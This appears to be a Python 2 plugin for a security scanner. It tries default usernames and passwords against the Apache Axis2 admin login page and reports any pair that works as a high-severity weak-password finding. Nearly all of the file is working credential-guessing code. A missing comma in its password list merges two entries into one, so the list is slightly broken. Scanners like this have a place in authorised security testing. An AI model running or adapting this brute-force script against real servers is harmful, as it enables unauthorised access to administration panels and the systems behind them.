# coding:utf-8
# author:wolf
import urllib2
from config import is_port_open, is_http


# @is_port_open
def verify(host, port=80, name=None, timeout=10, types='ip'):

    if types == 'ip':
        url = "http://%s:%d" % (host, int(port))
    else:
        url = 'http://{}'.format(host)
    error_i = 0
    flag_list = ['Administration Page</title>', 'System Components', '"axis2-admin/upload"',
                 'include page="footer.inc">', 'axis2-admin/logout']
    user_list = ['axis', 'admin', 'root']
    PASSWORD_DIC = ['admin', 'root', '123456' 'admin888']
    PASSWORD_DIC.append('axis2')
    for user in user_list:
        for password in PASSWORD_DIC:
            try:
                login_url = url + '/axis2/axis2-admin/login'
                PostStr = 'userName=%s&password=%s&submit=+Login+' % (user, password)
                request = urllib2.Request(login_url, PostStr)
                res = urllib2.urlopen(request, timeout=timeout)
                res_html = res.read()
            except urllib2.HTTPError as e:
                print "[poc_crack_axis] [line 23] [error={}]".format(repr(e))
                return
            except urllib2.URLError, e:
                error_i += 1
                if error_i >= 3:
                    return
                continue
            except Exception as e:
                return
            for flag in flag_list:
                if flag in res_html:
                    info = {
                        "url": login_url,
                        "vuln_name": "axis2 weak password",
                        "severity": "high",
                        "proof": "username={}&password={}".format(user, password)
                    }
                    return info
